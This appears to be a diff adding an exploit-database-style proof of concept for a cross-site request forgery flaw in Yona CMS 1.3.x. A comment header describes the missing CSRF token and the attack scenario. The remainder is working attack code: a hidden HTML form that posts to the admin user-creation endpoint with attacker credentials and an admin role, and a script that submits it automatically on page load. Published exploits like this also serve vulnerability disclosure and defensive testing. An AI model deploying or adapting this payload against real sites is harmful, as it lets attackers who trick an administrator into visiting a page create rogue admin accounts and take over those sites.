@@ -1,0 +1,34 @@
+<!--
+# Exploit Title: Yona CMS <= 1.3.x Remote Admin Add CSRF Exploit
+# Exploit Author: s0nk3y
+# Google Dork: -
+# Date: 21/06/2016
+# Vendor Homepage: http://yonacms.com
+# Software Link: https://github.com/oleksandr-torosh/yona-cms/
+# Version: 1.3.x
+# Tested on: Ubuntu 16.04
+
+Yona CMS is vulnerable to CSRF attack (No CSRF token in place) meaning
+that if an admin user can be tricked to visit a crafted URL created by
+attacker (via spear phishing/social engineering), a form will be submitted
+to (http://localhost/admin/admin-user/add) that will add a
+new user as administrator.
+Once exploited, the attacker can login to the admin panel (
+http://localhost/admin)
+using the username and the password he posted in the form.
+
+CSRF PoC Code
+=============
+-->
+
+<form method="post" action="http://localhost/admin/admin-user/add">   
+<input type="hidden" name="login" value="attacker"/>
+<input type="hidden" name="email" value="attacker@email.com"/>
+<input type="hidden" name="name" value="attacker"/>
+<input type="hidden" name="role" value="admin"/>
+<input type="hidden" name="password" value="attackerPassword"/>
+<input type="hidden" name="active"/>
+</form>
+<script>
+document.forms[0].submit();
+</script>
